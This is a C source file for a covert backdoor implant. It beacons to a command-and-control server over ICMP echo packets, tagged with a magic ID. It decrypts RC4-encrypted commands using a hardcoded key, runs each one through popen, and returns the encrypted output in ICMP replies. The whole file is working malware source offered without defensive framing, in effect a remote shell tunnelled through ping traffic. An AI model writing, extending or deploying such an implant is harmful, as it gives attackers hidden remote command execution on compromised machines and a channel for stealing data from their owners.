#include "../include/implant.h"
#include "../include/rc4.h"

#define KEY "thisisapassword"
#define KEY_LENGTH 15
#define CHECK_ALLOC(x) {if (x == NULL) {fprintf(stderr, "Error: Cannot allocate memory\n"); exit(EXIT_FAILURE);}}

// creates a raw ICMP socket and binds it
int create_socket(void) {
    int sockfd;

    // create the raw ICMP socket
    if ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
        perror("socket()");
        exit(EXIT_FAILURE);
    }

    return sockfd;
}

// calculates checksum (proudly? stolen from the internet)
unsigned short cksum(unsigned short *addr, int len) {
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;

    while (nleft > 1) {
      sum += *w++;
      nleft -= 2;
    }

    if (nleft == 1) {
      *(unsigned char *)(&answer) = *(unsigned char *)w;
      sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;

    return answer;
}

// runs the command from the C2 and stores it in output, and returns the output size
size_t invoke_command(unsigned char *data, unsigned char *output) {
    FILE *ptr;
    char *buffer, *command;
    size_t temp_buffer_size;
    unsigned char *temp_buffer = (unsigned char *) calloc(BUFFER_SIZE + 6, 1); // added 6 to prevent overflow
    CHECK_ALLOC(temp_buffer);

    data[strlen((char *) data) - 1] = '\0'; // strip the newline

    // decrypt the command
    rc4(data, strlen((char *) data), (unsigned char *) KEY, KEY_LENGTH, temp_buffer);

    command = strcat((char *) temp_buffer, " 2>&1"); // redirect stderr to stdout

    ptr = popen(command, "r");
    if (ptr == NULL) {
        perror("popen()");
        return 0;
    }

    fread(temp_buffer, BUFFER_SIZE, 1, ptr);
    temp_buffer_size = strlen((char *) temp_buffer);

    buffer = malloc(sizeof(char) * temp_buffer_size);
    CHECK_ALLOC(buffer);

    memmove(buffer, (char *) temp_buffer, temp_buffer_size);

    // encrypt the output
    rc4((unsigned char *) buffer, temp_buffer_size, (unsigned char *) KEY, KEY_LENGTH, output);

    free(temp_buffer);
    free(buffer);
    pclose(ptr);

    return temp_buffer_size;
}

// reads from the socket and put it in the buffer
int read_from_socket(int sockfd, unsigned char *buffer, int size) {
    int bytes_num = read(sockfd, buffer, size);

    if (bytes_num < 0) {
        perror("read()");
        return 0;
    }

    return 1;
}

// sends a beacon to the C2 with the magic byte
int send_beacon(int sockfd, char *dst_ip) {
    char *packet;
    struct icmphdr *icmp;
    int packet_size = sizeof(struct icmphdr *);
    ssize_t bytes_num;
    struct sockaddr_in dst;

    packet = malloc(sizeof(unsigned char) * packet_size);
    CHECK_ALLOC(packet)

    // setting the IP options
    dst.sin_family = AF_INET;
    inet_aton(dst_ip, &dst.sin_addr);

    // setting the ICMP options
    icmp = (struct icmphdr *) packet;
	icmp->type = 8;
	icmp->code = 8;
	icmp->un.echo.id = 9001;
    icmp->checksum = cksum((unsigned short *) icmp, packet_size);

    bytes_num = sendto(sockfd, icmp, sizeof(struct icmphdr), 0, (struct sockaddr *) &dst, sizeof(dst));
    if (bytes_num < 0) {
        perror("sendto()");
        free(packet);
        return -1;
    }

    free(packet);

    return 1;
}

// check if we got an actual connection from our C2
int check_magic_byte(struct icmphdr *icmp) {

    if (icmp->type == 8 && icmp->un.echo.id == 9001) {
        return 1;
    }

    return 0;
}

// the actual interaction occurs here
void interact(int sockfd, char *dest_ip) {
    struct iphdr *ip; // holds the IP header
    struct icmphdr *icmp; // holds the ICMP header
    unsigned char *data; // holds the ICMP's data section
    unsigned char *output; // holds the output of the command
    unsigned char *packet; // holds the packet
    struct sockaddr_in addr;
    size_t bytes_num, packet_size, output_size;

    output = malloc(sizeof(unsigned char) * BUFFER_SIZE);
    CHECK_ALLOC(output);

    // calculating the packet size
    packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + BUFFER_SIZE;

    // allocating a buffer to store the recieved ICMP packet
    packet = malloc(sizeof(unsigned char) * packet_size);
    CHECK_ALLOC(packet)

    while (1) {
        // send a beacon and wait for commands
        // gotta figure out how to better control it
        send_beacon(sockfd, dest_ip);

        if (!read_from_socket(sockfd, packet, packet_size)) {
            perror("read()");
            exit(EXIT_FAILURE);
        }

        ip = (struct iphdr *) packet;
        icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));

        // set the IP & ICMP headers for later usage
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = ip->saddr;
        icmp->type = 0;

        // get the data section (ignoring the IP & ICMP headers)
        data = (unsigned char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
        data[BUFFER_SIZE] = '\0';

        // invoke the command
        output_size = invoke_command(data, output);

        // put the output in the data section of the ICMP packet
        memmove(data, output, output_size);

        // calculate the checksum
        icmp->checksum = 0; // needs to be set before calculating for some weird reason
        icmp->checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + output_size);

        // send it
        bytes_num = sendto(sockfd, icmp, sizeof(struct icmphdr) + output_size, 0, (struct sockaddr *) &addr, sizeof(addr));
        if (bytes_num < 0) {
            perror("sendto()");
            break;
        }

        // clean up the packet buffer for the next usage
        memset(packet, '\0', packet_size);
    }

    free(output);
    free(packet);
}

// initializes the options and starts the implant
void implant_init_n_call(char *dest_ip) {
    int sockfd = create_socket();

    interact(sockfd, dest_ip);

    close(sockfd);
}
